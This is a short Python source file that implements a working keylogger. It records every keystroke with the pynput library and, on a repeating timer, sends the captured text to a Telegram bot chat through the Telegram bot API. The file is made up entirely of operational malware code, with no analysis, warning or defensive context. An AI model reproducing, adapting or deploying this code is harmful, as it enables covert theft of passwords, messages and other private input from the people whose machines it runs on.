#!/usr/bin/env python3
import pynput.keyboard
import threading
import requests

def to_normal_telegram_string(text):
    array = "qwertyuiopasdfghjklzxcvbnm1234567890-+=\n()*"
    res =""
    for symbol in text:
        if symbol =="_":
            res += "--"
        if symbol.lower() in array:
            res += symbol
    return res

class Keylogger:
    def __init__(self, time_interval , bot_token , chatId):
        self.interval = time_interval
        self.log = "Start keylogger. Remind ( construction -- is undescore )"
        self.bot_token = bot_token
        self.chatId = chatId

    def append_to_log(self,string):
        self.log += string

    def process_key_press(self,key):
        current_key = ""
        try:
            current_key = str(key.char)
        except AttributeError:
            if str(key) == "Key.space":
                current_key = " "
            elif str(key) == "Key.enter":
                current_key =  "\n"
            elif str(key) == "Key.backspace":

                try:
                    self.log = self.log[:-1]
                except:
                    self.log = ""
        current_key = to_normal_telegram_string(current_key)
        self.append_to_log(current_key)

    def send_text(self,text):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage?chat_id={self.chatId}&parse_mode=Markdown&text={text}"
        requests.get(url)

    def report(self):
        self.send_text(self.log)
        self.log = ""
        timer = threading.Timer(self.interval,self.report)
        timer.start()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
